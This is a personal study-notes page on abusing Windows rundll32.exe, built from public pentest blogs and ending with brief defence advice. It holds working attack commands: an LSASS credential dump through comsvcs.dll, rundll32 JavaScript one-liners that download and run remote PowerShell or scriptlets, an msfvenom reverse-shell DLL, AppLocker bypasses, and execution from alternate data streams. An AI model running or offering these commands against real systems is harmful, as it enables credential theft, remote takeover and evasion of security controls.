# rundll32 
20240402

[[lateral_movement]]
[[alternate_data_streams]]
[[cmd]]
[[regedit]]
[[applocker]]
[[poc]]

## About Rundll32 
We should look at the path it is being executed from: 

Ensure alwarys: 

```
\Windows\System32\rundll32.execute
```
OR
```
\Windows\SysWOW64\rundll32.execute
```


https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90


## Known abusers
HAFNIUM: A likely state-sponsored cyber espionage group operating out of China that targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs. 

APT29 (aka Cozy Bear): A threat group that has been attributed to Russia's Foreign Intelligence Service (SVR) that often targets government networks in Europe and NATO member countries, research institutes, and think tanks. APT29 reportedly compromised the Democratic National Committee starting in the summer of 2015 and is reportedly responsible for the SolarWinds breach and the resulting supply-chain attack in 2020, where victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East.

Carbanak: An international cybercriminal group that targets financial institutions since at least 2013, they install VNC server software that executes through rundll32. 

https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code 

## OS Cred Dumping
it could leverage comsvcs.dll (a Microsoft-signed DLL) which exports a function called MiniDumpW that rely on MiniDumpWriteDump to dump lsass.exe (Local Security Authority Subsystem Service) process memory to retrieve credentials.

```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS PID> <DUMP PATH> full
```
where <LSASS PID> is the process ID of LSASS and <DUMP PATH> the output to be written. Note that this requires Local Administrator or SYSTEM privileges.

https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code 
## AppLocker bypass
### About
Rundll32 is a Microsoft binary that can execute code that is inside a DLL file. Since this utility is part of the Windows operating system it can be used as a method in order to bypass AppLocker rules or Software Restriction Policies. So if the environment is not properly lockdown and users are permitted to use this binary then they can write their own DLL’s and bypass any restrictions or execute malicious JavaScript code.

The Metasploit module web delivery can quickly create a webserver that will serve a specific payload (Python, PHP or PowerShell). In this case the payload will be PowerShell.

```
exploit/multi/script/web_delivery
```
If the command prompt is locked then the method that is described below can be used to unlock the cmd.
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
```
Rundll32 will execute the arbitrary code and it will return a Meterpreter session. The main benefit of this is that since it will not touch the disk the AppLocker rule will bypassed.

https://pentestlab.blog/tag/rundll32/

I often hear that AppLocker is not very safe and it is easy to bypass.
Since I really like AppLocker and I recommend it to customers, I decided to do this blogpost series and go over the different bypasses

https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
### Commands: 
These are commands used to bypass Applocker. 
```
rundll32 shell32.dll,Control_RunDLL payload.dll
```
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication <HTML Code>
```
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
```
```
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
```
Note that Defender must be turned off. It will be triggered by JacaScript. 

My conclusion is that this is not a valid bypass on an up-to-date Windows 10 machine with default AppLocker rules. However, my testing is limited by both time and knowledge and of course this could mean that there is a method of using rundll32 that will bypass AppLocker default rules if someone is creative enough.

https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/

This repo here: https://github.com/api0cradle/UltimateAppLockerByPassList has a huge list of bypasses that can be employed. 

### Video Demonstations
A Youtube video can be see here: 
https://www.youtube.com/watch?v=z04NXAkhI4k

### AppLocker Setup
Microsoft default rules can be used to set it up. This is done in the Group Policy Manager. 

See https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/ as there are GIFs on how to set this up. 



### Using Meterpreter
Metasploit Msfvenom can be used in order to create a custom DLL that will contain a meterpreter payload:

On Attacker machine:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.3 LPORT=44444 -f dll -o pentestlab.dll
```
Then on the victim machine we need to run the rundll32 command: 
```
rundll32 shell32.dll,Control_RunDLL C:\Users\pentestlab.dll
```
This can be done using the Run command. Then a on the acctacker machine they should have a shell. 

https://pentestlab.blog/tag/rundll32/
### Cmd Locked
In Windows systems that have locked the command prompt via an AppLocker rule it is possible to bypass this restriction by injecting a malicious DLL file into a legitimate process. 

Didier Stevens has released a modified version of cmd in the form of a DLL file by using an open source variant obtained from the ReactOS

Since the rundll32 is a trusted Microsoft utility it can be used to load the cmd.dll into a process, execute the code on the DLL and therefore bypass the AppLocker rule and open the command prompt. The following two commands can be executed from the Windows Run:
```
rundll32 C:\cmd.dll,EntryPoint
```
Then: 
```
rundll32 shell32.dll,Control_RunDLL C:\cmd.DLL
```
We should get a cmd prompt open. 

https://pentestlab.blog/tag/rundll32/
### Registry 

The same technique can be applied in systems where the registry is locked.

Didier Stevens released also a modified version of registry editor in the form of a DLL like the command prompt above.

The registry is locked warning dialogue box. 

The following commands can load and run the regedit.dll via rundll32 and therefore bypass the AppLocker rule.
```
rundll32 C:\regedit.dll,EntryPoint
```
```
rundll32 shell32.dll,Control_RunDLL C:\regedit.DLL
```
These commands are entered into the Run window. We should then see registry editor unlocked. 

https://pentestlab.blog/tag/rundll32/

### COM Hijacking

With a legitimate CLSID reference and registered Program ID (ProgID), we can simply hijack a registered COM structure under the context of an unprivileged user.  In this example, let’s load Casey Smith’s (@subTee) “scripting.dictionary” COM Hijack reg file that calls a remote COM script.  This sets us up for a “squiblydoo” AppLocker bypass 

```
rundll32.exe -sta {00000001-0000-0000-0000-0000FEEDACDC}
```






https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/

## Alternate Data Streams
### About
using it as part of a persistence. 

My first meeting with this as a persistence technique was when Matt Nelson aka @Enigma0x3 wrote a blogpost about using it: https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/

Quite recently I have started to play with AppLocker bypasses to create a tool and somehow I saw a shiny thing that I just had to look at. I did a normal check on my AppLocker test system using Accesschk.exe and discovered a writable file within the Teamviewer folder.
A log file to be exact. This lead me to the discovery that you can inject data into the alternate stream of that file, execute it and it will work as an AppLocker bypass.
I posted a tweet about this here: https://twitter.com/Oddvarmoe/status/951757732557852673

### Commands
So what I did was that I first injected the payload into the ADS of the log file using this command:
```
"type c:\temp\bginfo.exe > "C:\program files (x86)\Teamviewer\TeamViewer12_Logfile.log:bginfo.exe"
```

Then I used the following command to execute it:
```
"wmic process call create '"C:\program files (x86)\Teamviewer\TeamViewer12_Logfile.log:bginfo.exe"'
```
After I was done looking at this bypass I got even more curious. What sort of other processes are able to execute from ADS?

I did some Googling around ADS and found out that back in the days you could use:
```
start c:\folder\file.exe:ADSStream.exe
```
to launch executables from ADS.
This is now blocked.

After some testing, searching and playing around I figured out the following, are at least possible to execute from ADS (And I am sure that there are hundreds more as well):

Furthermore, another command is: 
```
type "C:\temp\messagebox64.dll" > "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll"
```
```
rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain
```
https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/

## Lateral Movement 
[[LocalServer32]]

Vendors are notorious for including and/or leaving behind Registry artifacts that could potentially be abused by attackers for lateral movement, evasion, bypass, and persistence.

CLSIDs subkeys (LocalServer32 and InprocServer32) can be enumerated to discover abandoned binary references.


https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/


### Evasive DLL Loading
discovered registry artifacts from VMware Workstation that were left behind after uninstalling the software from the machine.  Interestingly, the following CLSID and directory structures were still in place. 

The folder structure also remained without the software binaries and dependencies.  The following ACL entries were effective on this folder

(Un)fortunately, an unprivileged user lacks the ability to write to this directory.  However, we can still demonstrate a privileged user’s attempt to “blend in” by copying a ‘malicious’ DLL into the directory as ‘vmnetbridge.dll’ to influence InprocServer32 key loading:

The below command can load the DLL payload associated with the corresponding CLSID. 

Granted, this example loads under a privileged context, but the implications *could* become very interesting if a normal user can influence a path element of ‘abandoned’ registry CLSIDs.

In general, this also makes for a viable persistence mechanism via Run key or Scheduled Task.

https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/

### Commands
Interestingly, CLSIDs can be called (‘invoked’) with this command:
```
rundll32.exe -sta {CLSID}
```
The -sta (/sta) switch refers to “single-threaded apartment” which is a part of the COM Threading Architecture.  

Interestingly, powershell.exe has a -sta switch to start powershell with a single threaded apartment (by default after version 2 anyway).  When called with the respective CLSID (or ProgID if available), this switch in rundll32.exe loads (‘invokes’) the reference binary via LocalServer32 or InprocServer32.



https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
### Defence Strats
Defensive recommendations – clean up artifacts after removal (e.g. unregister), monitor for suspicious events (e.g. rundll32.exe usage), and implement strong Application Whitelisting (AWL) policies/rules.

Vendors should remove (e.g. unregister) COM registry artifacts (and disk artifacts) when utility software is uninstalled.  Additionally, vendors should not create CLSID binary path registry key-values that point to non-existent binaries

Net defenders should monitor for interesting host activity, especially for rundll32.exe usage.  Take note the ‘sta’ switch can be successfuly called with a suffix such as ‘stagggg’ or ‘stagggggggggggggggggg’ along with the CLSID

Organizations should implement strong Application Whitelisting (AWL) policies and move beyond default rules.

https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/

## DevSetCookie / Web Dav WebClient
One of the mysterious command lines in a “rundll32.exe” instance that’ll show up a lot in the logs, takes the following format.
```
C:\WINDOWS\System32\rundll32.exe C:\Windows\system32\davclnt.dll,DavSetCookie <Host> <Share>
```
When using the “file://” protocol, whether be it in a word file, or via share windows will sometimes use (if SMB is disabled in some cases) the WebDav Client to request these files. When that happens a request will be made via the “rundll32.exe” utility.








